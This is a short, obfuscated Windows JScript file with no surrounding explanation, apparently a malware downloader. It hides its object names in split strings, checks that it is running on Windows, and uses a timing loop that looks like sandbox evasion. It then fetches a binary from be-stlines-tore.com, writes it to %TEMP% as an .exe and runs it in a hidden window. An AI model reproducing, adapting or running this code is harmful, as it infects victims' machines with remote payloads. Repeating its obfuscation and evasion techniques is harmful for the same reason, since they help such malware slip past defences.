var A0 = false;
var Y0 = "Create"+"Object";
var PK = function W() {return WScript[Y0]("WScript"+".Shell");}(), O = 11;
var UO = "MSXML2"+".XMLHTTP";
var ZY = 2;
var K = ZY - 2;
function M(TW){PK["Run"](TW, K, K);};
function X(){return UO + "";};
function AI(A1, K0){K = K * 1; return A1 - K0;};
function H(){return Y0;};
/*@cc_on
  @if (@_win32 || @_win64)
    A0 = true;
  @end
@*/
if (A0)
{
var TI = "";
function V(){return 22;};
var G = 0; var Z0 = 0;
function TO()
{
var Y2 = new this["Date"]();
var Z = Y2["getUTCMilliseconds"]();
WScript["Sleep"](V());
var Y2 = new this["Date"]();
var A = Y2["getUTCMilliseconds"]();
WScript["Sleep"](V());
var Y2 = new this["Date"]();
var Y1 = Y2["getUTCMilliseconds"]();
var G = "RS";
G = AI(A, Z);
var Z0 = "NL";
Z0 = AI(Y1, A);
TI = "open";
return AI(G, Z0);
}
var RN = false;
var R = false;
for (var YM = K; YM < V() * 1; YM++){if (TO() != K){
RN = true; 
Z0 = "31" + 11 * G + Z0; 
R = true; 
break;
}}
function JK() {return ((RN == true) && (RN == R)) ? 1 : K;};
if (RN && JK() && R){
function LO() {return PK["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ovibhDRb.ex" + "e";};
 P = X();
 V0 = WScript[Y0](P);
 var WT = 1;
do { 
	for (;WT;){
	try {
		if (WT == 1)
		{
			V0[TI]("GET", "http://be-stlines-tore.com/k3soa", false);
			V0["send"]();
			D = "Sleep";
			WT = 2;
		}
		WScript[D](V() + 120); 
		if (V0["readystate"] < 2 * 2) continue;
		WT = K;
		function IW(RH) {var IF = (1, 2, 3, 4, 5, RH); return IF;};
		U = WScript[H()]("ADODB.Stream");
		P = U;
		P[TI]();
		P["type"] = IW(1);
		P["write"](V0["ResponseBody"]);
		U["position"] = IW(K);
		P["Save" + "ToFile"](LO(), 2);
		U["cl"+"ose"]();
		Y = LO();
		M(Y);
	} catch(ED){};};
}while (WT);
}
}

